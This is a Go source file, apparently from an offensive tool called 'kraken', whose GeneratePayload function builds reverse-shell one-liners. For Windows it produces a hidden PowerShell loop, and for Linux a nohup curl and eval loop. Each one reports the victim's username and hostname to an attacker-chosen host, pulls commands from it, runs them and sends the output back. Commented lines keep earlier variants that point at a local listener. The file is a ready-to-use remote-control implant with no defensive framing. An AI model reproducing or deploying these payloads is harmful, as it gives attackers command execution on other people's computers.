package PayloadGenerator

import (
	"framework/kraken/Gostyle/Fore"
	"framework/kraken/Gostyle/Log"
	"framework/kraken/Utilities"
)

func GeneratePayload(os string, l string) string {
	switch os {
	case ("windows"):
		return Fore.Colorize(Fore.GREEN, `Start-Process $PSHOME\powershell.exe -ArgumentList { for (;;) { try {$u=$env:USERNAME;$h=$env:COMPUTERNAME;$o='windows';$p='http://';$s='`+l+`';$f=(15 -as [char])+(15 -as [char])+(255 -as [char]);$b=$f;$r=(iwr $p$s/?uname=$u'&&'hname=$h'&&'oname=$o -UseBasicParsing -Method Post -Body $b).Content;if ($r -ne 'None') {try { $b = (iex $r 2>&1 | Out-String ); } catch {  $b = $_   } $r=(iwr $p$s/?uname=$u'&&'hname=$h'&&'oname=$o -UseBasicParsing -Method Post -Body $b).Content}Sleep 3} catch {Sleep 14}} } -WindowStyle Hidden`)
	case ("linux"):
		return Fore.Colorize(Fore.GREEN, `nohup `+"`"+`while true;do l="http://`+l+`/?uname=$(whoami)&&hname=$(hostname)&&oname=$(uname -s|tr '[:upper:]' '[:lower:]')";r=$(curl -sX POST "$l" -d "$(echo Dw//Cg==|base64 -d)");[ "$r" != "None" ]&& { r=$(curl -sX POST "$l" -d "$(eval "$r</dev/null" 2>&1)");};sleep 3;done`+"`"+` &`)
	default:
		Log.Error("Os not supported.")
		return Utilities.StringEmpty
	}
}

//return Fore.Colorize(Fore.GREEN, `nohup `+"`"+`while true; do u=$(whoami); h=$(hostname); o="linux"; p="http://"; s="`+lhost+`:`+lport+`"; f=$'\017\017\377'; b=$f; r=$(curl -s -X POST "$p$s/?uname=$u&&hname=$h&&oname=$o" -d "$b"); [ "$r" != "None" ] && { b=$(eval "$r < /dev/null" 2>&1); r=$(curl -s -X POST "$p$s/?uname=$u&&hname=$h&&oname=$o" -d "$b"); }; sleep 3; done`+"`"+` &`)
//                                               while true;do u=$(whoami);h=$(hostname);o=$(uname -s|tr '[:upper:]' '[:lower:]');p="http://";s="127.0.0.1:8080";z=$(echo Dw//Cg==|base64 -d);b=$z;r=$(curl -sX POST "$p$s/?uname=$u&&hname=$h&&oname=$o" -d "$b");[ "$r" != "None" ]&& { b=$(eval "$r</dev/null" 2>&1);r=$(curl -sX POST "$p$s/?uname=$u&&hname=$h&&oname=$o" -d "$b");};sleep 3; done
//                                               while true; do l="http://127.0.0.1:8080/?uname=$(whoami)&&hname=$(hostname)&&oname=$(uname -s|tr '[:upper:]' '[:lower:]')";r=$(curl -sX POST "$l" -d "$(echo Dw//Cg==|base64 -d)");[ "$r" != "None" ]&& { b=$(eval "$r</dev/null" 2>&1);r=$(curl -sX POST "$l" -d "$b");};sleep 3;done
//                                               while true;do l="http://127.0.0.1:8080/?uname=$(whoami)&&hname=$(hostname)&&oname=$(uname -s|tr '[:upper:]' '[:lower:]')";r=$(curl -sX POST "$l" -d "$(echo Dw//Cg==|base64 -d)");[ "$r" != "None" ]&& { r=$(curl -sX POST "$l" -d "$(eval "$r</dev/null" 2>&1)");};sleep 3;done
